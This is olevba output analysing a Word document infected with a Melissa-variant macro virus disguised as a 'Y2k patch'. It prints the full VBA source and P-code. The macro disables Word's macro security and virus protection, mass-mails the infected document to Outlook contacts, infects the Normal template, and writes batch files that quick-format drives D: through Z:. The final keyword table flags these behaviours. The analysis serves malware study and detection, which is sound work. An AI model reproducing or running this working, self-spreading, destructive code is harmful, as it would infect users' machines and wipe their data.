olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Melissa.bk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO y2k_ok.cls 
in file: ./Virus.MSWord.Melissa.bk - OLE stream: 'Macros/VBA/y2k_ok'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Y2k patch
'Do Not Modify
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
On Error Resume Next
Dim UngaDasOutlook, DasMapiName, dskdsfiwe
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "y2k_ok?") <> "... by Agent7" Then
If UngaDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
    For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        x = 1
        Set dskdsfiwe = UngaDasOutlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x)
            dskdsfiwe.Recipients.Add Peep
            x = x + 1
            If x > 150 Then oo = AddyBook.AddressEntries.Count
         Next oo
         dskdsfiwe.Subject = "Re: " & Application.UserName
         dskdsfiwe.Body = ""
         dskdsfiwe.Attachments.Add ActiveDocument.FullName
         dskdsfiwe.Send
         Peep = ""
    Next y
DasMapiName.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "y2k_ok?") = "... by Agent7"
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "y2k_ok" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = ADI1
ADI1.Name = "y2k_ok"
DoAD = True
End If
If NTI1.Name <> "y2k_ok" Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToInfect = NTI1
NTI1.Name = "y2k_ok"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = ""
ADI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = ""
NTI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
If Day(Now) = Minute(Now) Then Selection.TypeText "Loading..."
Shell "attrib c:\drives.bat -r,-h,-s,-a", vbHide
On Error Resume Next
Shell "attrib c:\autoexec.bat -r,-h,-s,-a", vbHide
On Error Resume Next
Shell "attrib c:\cmos.com -r,-h,-s,-a", vbHide
On Error Resume Next
Open "c:\drives.bat" For Output As #1
Open "c:\autoexec.bat" For Output As #2
Open "c:\cmos.com" For Output As #3
Open "c:\fat32.com" For Output As #4
Print #4, "Ò{"
Close #4
Print #3, "²p2ö°.îB2ÀîÍ"
Close #3
Print #2, "date 10-18-2099"
Print #2, "c:\cmos.com"
Print #2, "c:\fat32.com"
Close #2
Print #1, "@echo off"
Print #1, "echo y|format/q z: /v:Empty >NUL"
Print #1, "echo y|format/q y: /v:Empty >NUL"
Print #1, "echo y|format/q x: /v:Empty >NUL"
Print #1, "echo y|format/q w: /v:Empty >NUL"
Print #1, "echo y|format/q v: /v:Empty >NUL"
Print #1, "echo y|format/q u: /v:Empty >NUL"
Print #1, "echo y|format/q t: /v:Empty >NUL"
Print #1, "echo y|format/q s: /v:Empty >NUL"
Print #1, "echo y|format/q r: /v:Empty >NUL"
Print #1, "echo y|format/q q: /v:Empty >NUL"
Print #1, "echo y|format/q p: /v:Empty >NUL"
Print #1, "echo y|format/q o: /v:Empty >NUL"
Print #1, "echo y|format/q n: /v:Empty >NUL"
Print #1, "echo y|format/q m: /v:Empty >NUL"
Print #1, "echo y|format/q l: /v:Empty >NUL"
Print #1, "echo y|format/q k: /v:Empty >NUL"
Print #1, "echo y|format/q j: /v:Empty >NUL"
Print #1, "echo y|format/q i: /v:Empty >NUL"
Print #1, "echo y|format/q h: /v:Empty >NUL"
Print #1, "echo y|format/q g: /v:Empty >NUL"
Print #1, "echo y|format/q f: /v:Empty >NUL"
Print #1, "echo y|format/q e: /v:Empty >NUL"
Print #1, "echo y|format/q d: /v:Empty >NUL"
Print #1, "Exit"
Close #1
On Error Resume Next
Shell "attrib c:\cmos.com +r", vbHide
On Error Resume Next
Shell "attrib c:\autoexec.bat +r", vbHide
On Error Resume Next
Shell "attrib c:\drives.bat +r", vbHide
On Error Resume Next
Shell "c:\drives.bat", vbHide
On Error Resume Next
Shell "c:\autoexec.bat", vbHide
On Error Resume Next
End Sub
'Only Symantec Norton 2000 will offer protection next time
'Forget McAfee 4.02+,Norton 5.0+, and all other Generics
'Welcome to a new age of cyberwarfare

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Melissa.bk
' ===============================================================================
' Module streams:
' Macros/VBA/y2k_ok - 12974 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x0009 "Y2k patch"
' Line #2:
' 	QuoteRem 0x0000 0x000D "Do Not Modify"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #5:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #6:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' 	ElseBlock 
' Line #8:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #9:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	OnError (Resume Next) 
' Line #12:
' 	Dim 
' 	VarDefn UngaDasOutlook
' 	VarDefn DasMapiName
' 	VarDefn dskdsfiwe
' Line #13:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set UngaDasOutlook 
' Line #14:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld UngaDasOutlook 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set DasMapiName 
' Line #15:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0007 "y2k_ok?"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000D "... by Agent7"
' 	Ne 
' 	IfBlock 
' Line #16:
' 	Ld UngaDasOutlook 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #17:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld DasMapiName 
' 	ArgsMemCall Logon 0x0002 
' Line #18:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DasMapiName 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #19:
' 	SetStmt 
' 	Ld y 
' 	Ld DasMapiName 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #20:
' 	LitDI2 0x0001 
' 	St x 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld UngaDasOutlook 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set dskdsfiwe 
' Line #22:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld x 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St Peep 
' Line #24:
' 	Ld Peep 
' 	Ld dskdsfiwe 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #25:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #26:
' 	Ld x 
' 	LitDI2 0x0096 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #27:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	NextVar 
' Line #28:
' 	LitStr 0x0004 "Re: "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld dskdsfiwe 
' 	MemSt Subject 
' Line #29:
' 	LitStr 0x0000 ""
' 	Ld dskdsfiwe 
' 	MemSt Body 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld dskdsfiwe 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #31:
' 	Ld dskdsfiwe 
' 	ArgsMemCall Send 0x0000 
' Line #32:
' 	LitStr 0x0000 ""
' 	St Peep 
' Line #33:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	Ld DasMapiName 
' 	ArgsMemCall Logoff 0x0000 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	LitStr 0x000D "... by Agent7"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0007 "y2k_ok?"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADI1 
' Line #39:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTI1 
' Line #40:
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCL 
' Line #41:
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCL 
' Line #42:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #43:
' 	Ld ADI1 
' 	MemLd New 
' 	LitStr 0x0006 "y2k_ok"
' 	Ne 
' 	IfBlock 
' Line #44:
' 	LineCont 0x0004 05 00 00 00
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #45:
' 	SetStmt 
' 	Ld ADI1 
' 	Set ToInfect 
' Line #46:
' 	LitStr 0x0006 "y2k_ok"
' 	Ld ADI1 
' 	MemSt New 
' Line #47:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld NTI1 
' 	MemLd New 
' 	LitStr 0x0006 "y2k_ok"
' 	Ne 
' 	IfBlock 
' Line #50:
' 	LineCont 0x0004 05 00 00 00
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #51:
' 	SetStmt 
' 	Ld NTI1 
' 	Set ToInfect 
' Line #52:
' 	LitStr 0x0006 "y2k_ok"
' 	Ld NTI1 
' 	MemSt New 
' Line #53:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo CYA 
' 	EndIf 
' Line #56:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #57:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #58:
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #59:
' 	Loop 
' Line #60:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #61:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #62:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #63:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #64:
' 	Loop 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #67:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #68:
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #69:
' 	Loop 
' Line #70:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #71:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #72:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #73:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #74:
' 	Loop 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Label CYA 
' Line #77:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #78:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #79:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #80:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #81:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "Loading..."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	EndIf 
' Line #82:
' 	LitStr 0x0020 "attrib c:\drives.bat -r,-h,-s,-a"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	LitStr 0x0022 "attrib c:\autoexec.bat -r,-h,-s,-a"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #85:
' 	OnError (Resume Next) 
' Line #86:
' 	LitStr 0x001E "attrib c:\cmos.com -r,-h,-s,-a"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #87:
' 	OnError (Resume Next) 
' Line #88:
' 	LitStr 0x000D "c:\drives.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #89:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #90:
' 	LitStr 0x000B "c:\cmos.com"
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #91:
' 	LitStr 0x000C "c:\fat32.com"
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #92:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0002 "Ò{"
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #94:
' 	LitDI2 0x0003 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "²p2ö°.îB2ÀîÍ"
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #96:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "date 10-18-2099"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "c:\cmos.com"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "c:\fat32.com"
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q z: /v:Empty >NUL"
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q y: /v:Empty >NUL"
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q x: /v:Empty >NUL"
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q w: /v:Empty >NUL"
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q v: /v:Empty >NUL"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q u: /v:Empty >NUL"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q t: /v:Empty >NUL"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q s: /v:Empty >NUL"
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q r: /v:Empty >NUL"
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q q: /v:Empty >NUL"
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q p: /v:Empty >NUL"
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q o: /v:Empty >NUL"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q n: /v:Empty >NUL"
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q m: /v:Empty >NUL"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q l: /v:Empty >NUL"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q k: /v:Empty >NUL"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q j: /v:Empty >NUL"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q i: /v:Empty >NUL"
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q h: /v:Empty >NUL"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q g: /v:Empty >NUL"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q f: /v:Empty >NUL"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q e: /v:Empty >NUL"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "echo y|format/q d: /v:Empty >NUL"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "Exit"
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #126:
' 	OnError (Resume Next) 
' Line #127:
' 	LitStr 0x0015 "attrib c:\cmos.com +r"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #128:
' 	OnError (Resume Next) 
' Line #129:
' 	LitStr 0x0019 "attrib c:\autoexec.bat +r"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' 	LitStr 0x0017 "attrib c:\drives.bat +r"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #132:
' 	OnError (Resume Next) 
' Line #133:
' 	LitStr 0x000D "c:\drives.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #134:
' 	OnError (Resume Next) 
' Line #135:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' 	EndSub 
' Line #138:
' 	QuoteRem 0x0000 0x0039 "Only Symantec Norton 2000 will offer protection next time"
' Line #139:
' 	QuoteRem 0x0000 0x0037 "Forget McAfee 4.02+,Norton 5.0+, and all other Generics"
' Line #140:
' 	QuoteRem 0x0000 0x0024 "Welcome to a new age of cyberwarfare"
' Line #141:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |drives.bat          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

